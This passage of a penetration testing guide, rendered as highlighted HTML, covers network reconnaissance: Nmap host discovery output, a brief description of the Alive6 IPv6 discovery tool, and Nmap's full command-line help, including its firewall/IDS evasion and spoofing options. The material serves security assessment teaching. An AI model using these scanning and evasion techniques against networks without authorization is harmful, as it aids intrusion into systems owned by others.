<span class="n">MAC</span> <span class="n">Address</span><span class="p">:</span> <span class="n">A8</span><span class="p">:</span><span class="n">E3</span><span class="p">:</span><span class="n">EE</span><span class="p">:</span><span class="mi">97</span><span class="p">:</span><span class="mi">3</span><span class="n">D</span><span class="p">:</span><span class="mi">46</span> <span class="p">(</span><span class="n">Sony</span> <span class="n">Computer</span> <span class="n">Entertainment</span><span class="p">)</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.25</span><span class="o">.</span><span class="mf">0.113</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span><span class="o">.</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.25</span><span class="o">.</span><span class="mf">0.119</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.018</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">MAC</span> <span class="n">Address</span><span class="p">:</span> <span class="mi">00</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">6</span><span class="n">C</span><span class="p">:</span><span class="n">B4</span><span class="p">:</span><span class="mi">3</span><span class="n">A</span><span class="p">:</span><span class="mi">93</span> <span class="p">(</span><span class="n">Netgear</span><span class="p">)</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">256</span> <span class="n">IP</span> <span class="n">addresses</span> <span class="p">(</span><span class="mi">4</span> <span class="n">hosts</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">6.19</span> <span class="n">seconds</span>
</pre></div>
</div>
<p>Alive6 (Linux)</p>
<div class="line-block">
<div class="line">Alive6, which is part of the THC IPv6 Attack Toolkit, offers the most
effective mechanism for detecting all IPv6 systems.</div>
<div class="line-block">
<div class="line"><a class="reference external" href=":File:Penetration_Testing_Execution_39.png">Screenshot Here</a></div>
</div>
</div>
<p>Alive6 offers numerous options, but can be simply run by just specifying
the interface. This returns all the IPv6 systems that are live on the
local-link.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_40.png">Screenshot Here</a></p>
</div>
<div class="section" id="id2">
<h5>Port Scanning<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h5>
<p>Nmap (Windows/Linux)</p>
<p>Nmap (&#8220;Network Mapper&#8221;) is the de facto standard for network
auditing/scanning. Nmap runs on both Linux and Windows. Nmap is
available in both command line and GUI versions. For the sake of this
document, we will only cover the command line.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Nmap</span> <span class="mf">5.51</span> <span class="p">(</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span>
<span class="n">Usage</span><span class="p">:</span> <span class="n">nmap</span> <span class="p">[</span><span class="n">Scan</span> <span class="n">Type</span><span class="p">(</span><span class="n">s</span><span class="p">)]</span> <span class="p">[</span><span class="n">Options</span><span class="p">]</span> <span class="p">{</span><span class="n">target</span> <span class="n">specification</span><span class="p">}</span>
<span class="n">TARGET</span> <span class="n">SPECIFICATION</span><span class="p">:</span>
  <span class="n">Can</span> <span class="k">pass</span> <span class="n">hostnames</span><span class="p">,</span> <span class="n">IP</span> <span class="n">addresses</span><span class="p">,</span> <span class="n">networks</span><span class="p">,</span> <span class="n">etc</span><span class="o">.</span>
  <span class="n">Ex</span><span class="p">:</span> <span class="n">scanme</span><span class="o">.</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="p">,</span> <span class="n">microsoft</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="mi">24</span><span class="p">,</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.1</span><span class="p">;</span> <span class="mf">10.0</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mf">255.1</span><span class="o">-</span><span class="mi">254</span>
  <span class="o">-</span><span class="n">iL</span> <span class="o">&lt;</span><span class="n">inputfilename</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Input</span> <span class="kn">from</span> <span class="nn">list</span> <span class="n">of</span> <span class="n">hosts</span><span class="o">/</span><span class="n">networks</span>
  <span class="o">-</span><span class="n">iR</span> <span class="o">&lt;</span><span class="n">num</span> <span class="n">hosts</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Choose</span> <span class="n">random</span> <span class="n">targets</span>
  <span class="o">--</span><span class="n">exclude</span> <span class="o">&lt;</span><span class="n">host1</span><span class="p">[,</span><span class="n">host2</span><span class="p">][,</span><span class="n">host3</span><span class="p">],</span><span class="o">...&gt;</span><span class="p">:</span> <span class="n">Exclude</span> <span class="n">hosts</span><span class="o">/</span><span class="n">networks</span>
  <span class="o">--</span><span class="n">excludefile</span> <span class="o">&lt;</span><span class="n">exclude_file</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Exclude</span> <span class="nb">list</span> <span class="kn">from</span> <span class="nn">file</span>
<span class="n">HOST</span> <span class="n">DISCOVERY</span><span class="p">:</span>
  <span class="o">-</span><span class="n">sL</span><span class="p">:</span> <span class="n">List</span> <span class="n">Scan</span> <span class="o">-</span> <span class="n">simply</span> <span class="nb">list</span> <span class="n">targets</span> <span class="n">to</span> <span class="n">scan</span>
  <span class="o">-</span><span class="n">sn</span><span class="p">:</span> <span class="n">Ping</span> <span class="n">Scan</span> <span class="o">-</span> <span class="n">disable</span> <span class="n">port</span> <span class="n">scan</span>
  <span class="o">-</span><span class="n">Pn</span><span class="p">:</span> <span class="n">Treat</span> <span class="nb">all</span> <span class="n">hosts</span> <span class="k">as</span> <span class="n">online</span> <span class="o">--</span> <span class="n">skip</span> <span class="n">host</span> <span class="n">discovery</span>
  <span class="o">-</span><span class="n">PS</span><span class="o">/</span><span class="n">PA</span><span class="o">/</span><span class="n">PU</span><span class="o">/</span><span class="n">PY</span><span class="p">[</span><span class="n">portlist</span><span class="p">]:</span> <span class="n">TCP</span> <span class="n">SYN</span><span class="o">/</span><span class="n">ACK</span><span class="p">,</span> <span class="n">UDP</span> <span class="ow">or</span> <span class="n">SCTP</span> <span class="n">discovery</span> <span class="n">to</span> <span class="n">given</span> <span class="n">ports</span>
  <span class="o">-</span><span class="n">PE</span><span class="o">/</span><span class="n">PP</span><span class="o">/</span><span class="n">PM</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="ow">and</span> <span class="n">netmask</span> <span class="n">request</span> <span class="n">discovery</span> <span class="n">probes</span>
  <span class="o">-</span><span class="n">PO</span><span class="p">[</span><span class="n">protocol</span> <span class="nb">list</span><span class="p">]:</span> <span class="n">IP</span> <span class="n">Protocol</span> <span class="n">Ping</span>
  <span class="o">-</span><span class="n">n</span><span class="o">/-</span><span class="n">R</span><span class="p">:</span> <span class="n">Never</span> <span class="n">do</span> <span class="n">DNS</span> <span class="n">resolution</span><span class="o">/</span><span class="n">Always</span> <span class="n">resolve</span> <span class="p">[</span><span class="n">default</span><span class="p">:</span> <span class="n">sometimes</span><span class="p">]</span>
  <span class="o">--</span><span class="n">dns</span><span class="o">-</span><span class="n">servers</span> <span class="o">&lt;</span><span class="n">serv1</span><span class="p">[,</span><span class="n">serv2</span><span class="p">],</span><span class="o">...&gt;</span><span class="p">:</span> <span class="n">Specify</span> <span class="n">custom</span> <span class="n">DNS</span> <span class="n">servers</span>
  <span class="o">--</span><span class="n">system</span><span class="o">-</span><span class="n">dns</span><span class="p">:</span> <span class="n">Use</span> <span class="n">OS</span><span class="s1">&#39;s DNS resolver</span>
  <span class="o">--</span><span class="n">traceroute</span><span class="p">:</span> <span class="n">Trace</span> <span class="n">hop</span> <span class="n">path</span> <span class="n">to</span> <span class="n">each</span> <span class="n">host</span>
<span class="n">SCAN</span> <span class="n">TECHNIQUES</span><span class="p">:</span>
  <span class="o">-</span><span class="n">sS</span><span class="o">/</span><span class="n">sT</span><span class="o">/</span><span class="n">sA</span><span class="o">/</span><span class="n">sW</span><span class="o">/</span><span class="n">sM</span><span class="p">:</span> <span class="n">TCP</span> <span class="n">SYN</span><span class="o">/</span><span class="n">Connect</span><span class="p">()</span><span class="o">/</span><span class="n">ACK</span><span class="o">/</span><span class="n">Window</span><span class="o">/</span><span class="n">Maimon</span> <span class="n">scans</span>
  <span class="o">-</span><span class="n">sU</span><span class="p">:</span> <span class="n">UDP</span> <span class="n">Scan</span>
  <span class="o">-</span><span class="n">sN</span><span class="o">/</span><span class="n">sF</span><span class="o">/</span><span class="n">sX</span><span class="p">:</span> <span class="n">TCP</span> <span class="n">Null</span><span class="p">,</span> <span class="n">FIN</span><span class="p">,</span> <span class="ow">and</span> <span class="n">Xmas</span> <span class="n">scans</span>
  <span class="o">--</span><span class="n">scanflags</span> <span class="o">&lt;</span><span class="n">flags</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Customize</span> <span class="n">TCP</span> <span class="n">scan</span> <span class="n">flags</span>
  <span class="o">-</span><span class="n">sI</span> <span class="o">&lt;</span><span class="n">zombie</span> <span class="n">host</span><span class="p">[:</span><span class="n">probeport</span><span class="p">]</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Idle</span> <span class="n">scan</span>
  <span class="o">-</span><span class="n">sY</span><span class="o">/</span><span class="n">sZ</span><span class="p">:</span> <span class="n">SCTP</span> <span class="n">INIT</span><span class="o">/</span><span class="n">COOKIE</span><span class="o">-</span><span class="n">ECHO</span> <span class="n">scans</span>
  <span class="o">-</span><span class="n">sO</span><span class="p">:</span> <span class="n">IP</span> <span class="n">protocol</span> <span class="n">scan</span>
  <span class="o">-</span><span class="n">b</span> <span class="o">&lt;</span><span class="n">FTP</span> <span class="n">relay</span> <span class="n">host</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">FTP</span> <span class="n">bounce</span> <span class="n">scan</span>
<span class="n">PORT</span> <span class="n">SPECIFICATION</span> <span class="n">AND</span> <span class="n">SCAN</span> <span class="n">ORDER</span><span class="p">:</span>
  <span class="o">-</span><span class="n">p</span> <span class="o">&lt;</span><span class="n">port</span> <span class="n">ranges</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Only</span> <span class="n">scan</span> <span class="n">specified</span> <span class="n">ports</span>
    <span class="n">Ex</span><span class="p">:</span> <span class="o">-</span><span class="n">p22</span><span class="p">;</span> <span class="o">-</span><span class="n">p1</span><span class="o">-</span><span class="mi">65535</span><span class="p">;</span> <span class="o">-</span><span class="n">p</span> <span class="n">U</span><span class="p">:</span><span class="mi">53</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">137</span><span class="p">,</span><span class="n">T</span><span class="p">:</span><span class="mi">21</span><span class="o">-</span><span class="mi">25</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">8080</span><span class="p">,</span><span class="n">S</span><span class="p">:</span><span class="mi">9</span>
  <span class="o">-</span><span class="n">F</span><span class="p">:</span> <span class="n">Fast</span> <span class="n">mode</span> <span class="o">-</span> <span class="n">Scan</span> <span class="n">fewer</span> <span class="n">ports</span> <span class="n">than</span> <span class="n">the</span> <span class="n">default</span> <span class="n">scan</span>
  <span class="o">-</span><span class="n">r</span><span class="p">:</span> <span class="n">Scan</span> <span class="n">ports</span> <span class="n">consecutively</span> <span class="o">-</span> <span class="n">don</span><span class="s1">&#39;t randomize</span>
  <span class="o">--</span><span class="n">top</span><span class="o">-</span><span class="n">ports</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Scan</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span> <span class="n">most</span> <span class="n">common</span> <span class="n">ports</span>
  <span class="o">--</span><span class="n">port</span><span class="o">-</span><span class="n">ratio</span> <span class="o">&lt;</span><span class="n">ratio</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Scan</span> <span class="n">ports</span> <span class="n">more</span> <span class="n">common</span> <span class="n">than</span> <span class="o">&lt;</span><span class="n">ratio</span><span class="o">&gt;</span>
<span class="n">SERVICE</span><span class="o">/</span><span class="n">VERSION</span> <span class="n">DETECTION</span><span class="p">:</span>
  <span class="o">-</span><span class="n">sV</span><span class="p">:</span> <span class="n">Probe</span> <span class="nb">open</span> <span class="n">ports</span> <span class="n">to</span> <span class="n">determine</span> <span class="n">service</span><span class="o">/</span><span class="n">version</span> <span class="n">info</span>
  <span class="o">--</span><span class="n">version</span><span class="o">-</span><span class="n">intensity</span> <span class="o">&lt;</span><span class="n">level</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Set</span> <span class="kn">from</span> <span class="mi">0</span> <span class="p">(</span><span class="n">light</span><span class="p">)</span> <span class="n">to</span> <span class="mi">9</span> <span class="p">(</span><span class="k">try</span> <span class="nb">all</span> <span class="n">probes</span><span class="p">)</span>
  <span class="o">--</span><span class="n">version</span><span class="o">-</span><span class="n">light</span><span class="p">:</span> <span class="n">Limit</span> <span class="n">to</span> <span class="n">most</span> <span class="n">likely</span> <span class="n">probes</span> <span class="p">(</span><span class="n">intensity</span> <span class="mi">2</span><span class="p">)</span>
  <span class="o">--</span><span class="n">version</span><span class="o">-</span><span class="nb">all</span><span class="p">:</span> <span class="n">Try</span> <span class="n">every</span> <span class="n">single</span> <span class="n">probe</span> <span class="p">(</span><span class="n">intensity</span> <span class="mi">9</span><span class="p">)</span>
  <span class="o">--</span><span class="n">version</span><span class="o">-</span><span class="n">trace</span><span class="p">:</span> <span class="n">Show</span> <span class="n">detailed</span> <span class="n">version</span> <span class="n">scan</span> <span class="n">activity</span> <span class="p">(</span><span class="k">for</span> <span class="n">debugging</span><span class="p">)</span>
<span class="n">SCRIPT</span> <span class="n">SCAN</span><span class="p">:</span>
  <span class="o">-</span><span class="n">sC</span><span class="p">:</span> <span class="n">equivalent</span> <span class="n">to</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">default</span>
  <span class="o">--</span><span class="n">script</span><span class="o">=&lt;</span><span class="n">Lua</span> <span class="n">scripts</span><span class="o">&gt;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Lua</span> <span class="n">scripts</span><span class="o">&gt;</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">comma</span> <span class="n">separated</span> <span class="nb">list</span> <span class="n">of</span>
           <span class="n">directories</span><span class="p">,</span> <span class="n">script</span><span class="o">-</span><span class="n">files</span> <span class="ow">or</span> <span class="n">script</span><span class="o">-</span><span class="n">categories</span>
  <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=&lt;</span><span class="n">n1</span><span class="o">=</span><span class="n">v1</span><span class="p">,[</span><span class="n">n2</span><span class="o">=</span><span class="n">v2</span><span class="p">,</span><span class="o">...</span><span class="p">]</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">provide</span> <span class="n">arguments</span> <span class="n">to</span> <span class="n">scripts</span>
  <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">trace</span><span class="p">:</span> <span class="n">Show</span> <span class="nb">all</span> <span class="n">data</span> <span class="n">sent</span> <span class="ow">and</span> <span class="n">received</span>
  <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">updatedb</span><span class="p">:</span> <span class="n">Update</span> <span class="n">the</span> <span class="n">script</span> <span class="n">database</span><span class="o">.</span>
<span class="n">OS</span> <span class="n">DETECTION</span><span class="p">:</span>
  <span class="o">-</span><span class="n">O</span><span class="p">:</span> <span class="n">Enable</span> <span class="n">OS</span> <span class="n">detection</span>
  <span class="o">--</span><span class="n">osscan</span><span class="o">-</span><span class="n">limit</span><span class="p">:</span> <span class="n">Limit</span> <span class="n">OS</span> <span class="n">detection</span> <span class="n">to</span> <span class="n">promising</span> <span class="n">targets</span>
  <span class="o">--</span><span class="n">osscan</span><span class="o">-</span><span class="n">guess</span><span class="p">:</span> <span class="n">Guess</span> <span class="n">OS</span> <span class="n">more</span> <span class="n">aggressively</span>
<span class="n">TIMING</span> <span class="n">AND</span> <span class="n">PERFORMANCE</span><span class="p">:</span>
  <span class="n">Options</span> <span class="n">which</span> <span class="n">take</span> <span class="o">&lt;</span><span class="n">time</span><span class="o">&gt;</span> <span class="n">are</span> <span class="ow">in</span> <span class="n">seconds</span><span class="p">,</span> <span class="ow">or</span> <span class="n">append</span> <span class="s1">&#39;ms&#39;</span> <span class="p">(</span><span class="n">milliseconds</span><span class="p">),</span>
  <span class="s1">&#39;s&#39;</span> <span class="p">(</span><span class="n">seconds</span><span class="p">),</span> <span class="s1">&#39;m&#39;</span> <span class="p">(</span><span class="n">minutes</span><span class="p">),</span> <span class="ow">or</span> <span class="s1">&#39;h&#39;</span> <span class="p">(</span><span class="n">hours</span><span class="p">)</span> <span class="n">to</span> <span class="n">the</span> <span class="n">value</span> <span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">g</span><span class="o">.</span> <span class="mi">30</span><span class="n">m</span><span class="p">)</span><span class="o">.</span>
  <span class="o">-</span><span class="n">T</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">-</span><span class="mi">5</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Set</span> <span class="n">timing</span> <span class="n">template</span> <span class="p">(</span><span class="n">higher</span> <span class="ow">is</span> <span class="n">faster</span><span class="p">)</span>
  <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">hostgroup</span><span class="o">/</span><span class="nb">max</span><span class="o">-</span><span class="n">hostgroup</span> <span class="o">&lt;</span><span class="n">size</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Parallel</span> <span class="n">host</span> <span class="n">scan</span> <span class="n">group</span> <span class="n">sizes</span>
  <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">parallelism</span><span class="o">/</span><span class="nb">max</span><span class="o">-</span><span class="n">parallelism</span> <span class="o">&lt;</span><span class="n">numprobes</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Probe</span> <span class="n">parallelization</span>
  <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rtt</span><span class="o">-</span><span class="n">timeout</span><span class="o">/</span><span class="nb">max</span><span class="o">-</span><span class="n">rtt</span><span class="o">-</span><span class="n">timeout</span><span class="o">/</span><span class="n">initial</span><span class="o">-</span><span class="n">rtt</span><span class="o">-</span><span class="n">timeout</span> <span class="o">&lt;</span><span class="n">time</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Specifies</span>
      <span class="n">probe</span> <span class="nb">round</span> <span class="n">trip</span> <span class="n">time</span><span class="o">.</span>
  <span class="o">--</span><span class="nb">max</span><span class="o">-</span><span class="n">retries</span> <span class="o">&lt;</span><span class="n">tries</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Caps</span> <span class="n">number</span> <span class="n">of</span> <span class="n">port</span> <span class="n">scan</span> <span class="n">probe</span> <span class="n">retransmissions</span><span class="o">.</span>
  <span class="o">--</span><span class="n">host</span><span class="o">-</span><span class="n">timeout</span> <span class="o">&lt;</span><span class="n">time</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Give</span> <span class="n">up</span> <span class="n">on</span> <span class="n">target</span> <span class="n">after</span> <span class="n">this</span> <span class="n">long</span>
  <span class="o">--</span><span class="n">scan</span><span class="o">-</span><span class="n">delay</span><span class="o">/--</span><span class="nb">max</span><span class="o">-</span><span class="n">scan</span><span class="o">-</span><span class="n">delay</span> <span class="o">&lt;</span><span class="n">time</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Adjust</span> <span class="n">delay</span> <span class="n">between</span> <span class="n">probes</span>
  <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Send</span> <span class="n">packets</span> <span class="n">no</span> <span class="n">slower</span> <span class="n">than</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span> <span class="n">per</span> <span class="n">second</span>
  <span class="o">--</span><span class="nb">max</span><span class="o">-</span><span class="n">rate</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Send</span> <span class="n">packets</span> <span class="n">no</span> <span class="n">faster</span> <span class="n">than</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span> <span class="n">per</span> <span class="n">second</span>
<span class="n">FIREWALL</span><span class="o">/</span><span class="n">IDS</span> <span class="n">EVASION</span> <span class="n">AND</span> <span class="n">SPOOFING</span><span class="p">:</span>
  <span class="o">-</span><span class="n">f</span><span class="p">;</span> <span class="o">--</span><span class="n">mtu</span> <span class="o">&lt;</span><span class="n">val</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">fragment</span> <span class="n">packets</span> <span class="p">(</span><span class="n">optionally</span> <span class="n">w</span><span class="o">/</span><span class="n">given</span> <span class="n">MTU</span><span class="p">)</span>
  <span class="o">-</span><span class="n">D</span> <span class="o">&lt;</span><span class="n">decoy1</span><span class="p">,</span><span class="n">decoy2</span><span class="p">[,</span><span class="n">ME</span><span class="p">],</span><span class="o">...&gt;</span><span class="p">:</span> <span class="n">Cloak</span> <span class="n">a</span> <span class="n">scan</span> <span class="k">with</span> <span class="n">decoys</span>
  <span class="o">-</span><span class="n">S</span> <span class="o">&lt;</span><span class="n">IP_Address</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Spoof</span> <span class="n">source</span> <span class="n">address</span>
  <span class="o">-</span><span class="n">e</span> <span class="o">&lt;</span><span class="n">iface</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Use</span> <span class="n">specified</span> <span class="n">interface</span>
  <span class="o">-</span><span class="n">g</span><span class="o">/--</span><span class="n">source</span><span class="o">-</span><span class="n">port</span> <span class="o">&lt;</span><span class="n">portnum</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Use</span> <span class="n">given</span> <span class="n">port</span> <span class="n">number</span>
  <span class="o">--</span><span class="n">data</span><span class="o">-</span><span class="n">length</span> <span class="o">&lt;</span><span class="n">num</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Append</span> <span class="n">random</span> <span class="n">data</span> <span class="n">to</span> <span class="n">sent</span> <span class="n">packets</span>
  <span class="o">--</span><span class="n">ip</span><span class="o">-</span><span class="n">options</span> <span class="o">&lt;</span><span class="n">options</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Send</span> <span class="n">packets</span> <span class="k">with</span> <span class="n">specified</span> <span class="n">ip</span> <span class="n">options</span>
  <span class="o">--</span><span class="n">ttl</span> <span class="o">&lt;</span><span class="n">val</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Set</span> <span class="n">IP</span> <span class="n">time</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">live</span> <span class="n">field</span>
  <span class="o">--</span><span class="n">spoof</span><span class="o">-</span><span class="n">mac</span> <span class="o">&lt;</span><span class="n">mac</span> <span class="n">address</span><span class="o">/</span><span class="n">prefix</span><span class="o">/</span><span class="n">vendor</span> <span class="n">name</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Spoof</span> <span class="n">your</span> <span class="n">MAC</span> <span class="n">address</span>
  <span class="o">--</span><span class="n">badsum</span><span class="p">:</span> <span class="n">Send</span> <span class="n">packets</span> <span class="k">with</span> <span class="n">a</span> <span class="n">bogus</span> <span class="n">TCP</span><span class="o">/</span><span class="n">UDP</span><span class="o">/</span><span class="n">SCTP</span> <span class="n">checksum</span>
<span class="n">OUTPUT</span><span class="p">:</span>
  <span class="o">-</span><span class="n">oN</span><span class="o">/-</span><span class="n">oX</span><span class="o">/-</span><span class="n">oS</span><span class="o">/-</span><span class="n">oG</span> <span class="o">&lt;</span><span class="n">file</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Output</span> <span class="n">scan</span> <span class="ow">in</span> <span class="n">normal</span><span class="p">,</span> <span class="n">XML</span><span class="p">,</span> <span class="n">s</span><span class="o">|&lt;</span><span class="n">rIpt</span> <span class="n">kIddi3</span><span class="p">,</span>
     <span class="ow">and</span> <span class="n">Grepable</span> <span class="nb">format</span><span class="p">,</span> <span class="n">respectively</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">given</span> <span class="n">filename</span><span class="o">.</span>
  <span class="o">-</span><span class="n">oA</span> <span class="o">&lt;</span><span class="n">basename</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Output</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">three</span> <span class="n">major</span> <span class="n">formats</span> <span class="n">at</span> <span class="n">once</span>
  <span class="o">-</span><span class="n">v</span><span class="p">:</span> <span class="n">Increase</span> <span class="n">verbosity</span> <span class="n">level</span> <span class="p">(</span><span class="n">use</span> <span class="o">-</span><span class="n">vv</span> <span class="ow">or</span> <span class="n">more</span> <span class="k">for</span> <span class="n">greater</span> <span class="n">effect</span><span class="p">)</span>
  <span class="o">-</span><span class="n">d</span><span class="p">:</span> <span class="n">Increase</span> <span class="n">debugging</span> <span class="n">level</span> <span class="p">(</span><span class="n">use</span> <span class="o">-</span><span class="n">dd</span> <span class="ow">or</span> <span class="n">more</span> <span class="k">for</span> <span class="n">greater</span> <span class="n">effect</span><span class="p">)</span>
  <span class="o">--</span><span class="n">reason</span><span class="p">:</span> <span class="n">Display</span> <span class="n">the</span> <span class="n">reason</span> <span class="n">a</span> <span class="n">port</span> <span class="ow">is</span> <span class="ow">in</span> <span class="n">a</span> <span class="n">particular</span> <span class="n">state</span>
  <span class="o">--</span><span class="nb">open</span><span class="p">:</span> <span class="n">Only</span> <span class="n">show</span> <span class="nb">open</span> <span class="p">(</span><span class="ow">or</span> <span class="n">possibly</span> <span class="nb">open</span><span class="p">)</span> <span class="n">ports</span>
  <span class="o">--</span><span class="n">packet</span><span class="o">-</span><span class="n">trace</span><span class="p">:</span> <span class="n">Show</span> <span class="nb">all</span> <span class="n">packets</span> <span class="n">sent</span> <span class="ow">and</span> <span class="n">received</span>
  <span class="o">--</span><span class="n">iflist</span><span class="p">:</span> <span class="n">Print</span> <span class="n">host</span> <span class="n">interfaces</span> <span class="ow">and</span> <span class="n">routes</span> <span class="p">(</span><span class="k">for</span> <span class="n">debugging</span><span class="p">)</span>
  <span class="o">--</span><span class="n">log</span><span class="o">-</span><span class="n">errors</span><span class="p">:</span> <span class="n">Log</span> <span class="n">errors</span><span class="o">/</span><span class="n">warnings</span> <span class="n">to</span> <span class="n">the</span> <span class="n">normal</span><span class="o">-</span><span class="nb">format</span> <span class="n">output</span> <span class="n">file</span>
  <span class="o">--</span><span class="n">append</span><span class="o">-</span><span class="n">output</span><span class="p">:</span> <span class="n">Append</span> <span class="n">to</span> <span class="n">rather</span> <span class="n">than</span> <span class="n">clobber</span> <span class="n">specified</span> <span class="n">output</span> <span class="n">files</span>
  <span class="o">--</span><span class="n">resume</span> <span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Resume</span> <span class="n">an</span> <span class="n">aborted</span> <span class="n">scan</span>
  <span class="o">--</span><span class="n">stylesheet</span> <span class="o">&lt;</span><span class="n">path</span><span class="o">/</span><span class="n">URL</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">XSL</span> <span class="n">stylesheet</span> <span class="n">to</span> <span class="n">transform</span> <span class="n">XML</span> <span class="n">output</span> <span class="n">to</span> <span class="n">HTML</span>
  <span class="o">--</span><span class="n">webxml</span><span class="p">:</span> <span class="n">Reference</span> <span class="n">stylesheet</span> <span class="kn">from</span> <span class="nn">Nmap.Org</span> <span class="k">for</span> <span class="n">more</span> <span class="n">portable</span> <span class="n">XML</span>
  <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">stylesheet</span><span class="p">:</span> <span class="n">Prevent</span> <span class="n">associating</span> <span class="n">of</span> <span class="n">XSL</span> <span class="n">stylesheet</span> <span class="n">w</span><span class="o">/</span><span class="n">XML</span> <span class="n">output</span>
<span class="n">MISC</span><span class="p">:</span>
  <span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="n">Enable</span> <span class="n">IPv6</span> <span class="n">scanning</span>
  <span class="o">-</span><span class="n">A</span><span class="p">:</span> <span class="n">Enable</span> <span class="n">OS</span> <span class="n">detection</span><span class="p">,</span> <span class="n">version</span> <span class="n">detection</span><span class="p">,</span> <span class="n">script</span> <span class="n">scanning</span><span class="p">,</span> <span class="ow">and</span> <span class="n">traceroute</span>
  <span class="o">--</span><span class="n">datadir</span> <span class="o">&lt;</span><span class="n">dirname</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Specify</span> <span class="n">custom</span> <span class="n">Nmap</span> <span class="n">data</span> <span class="n">file</span> <span class="n">location</span>
  <span class="o">--</span><span class="n">send</span><span class="o">-</span><span class="n">eth</span><span class="o">/--</span><span class="n">send</span><span class="o">-</span><span class="n">ip</span><span class="p">:</span> <span class="n">Send</span> <span class="n">using</span> <span class="n">raw</span> <span class="n">ethernet</span> <span class="n">frames</span> <span class="ow">or</span> <span class="n">IP</span> <span class="n">packets</span>
  <span class="o">--</span><span class="n">privileged</span><span class="p">:</span> <span class="n">Assume</span> <span class="n">that</span> <span class="n">the</span> <span class="n">user</span> <span class="ow">is</span> <span class="n">fully</span> <span class="n">privileged</span>
  <span class="o">--</span><span class="n">unprivileged</span><span class="p">:</span> <span class="n">Assume</span> <span class="n">the</span> <span class="n">user</span> <span class="n">lacks</span> <span class="n">raw</span> <span class="n">socket</span> <span class="n">privileges</span>
  <span class="o">-</span><span class="n">V</span><span class="p">:</span> <span class="n">Print</span> <span class="n">version</span> <span class="n">number</span>
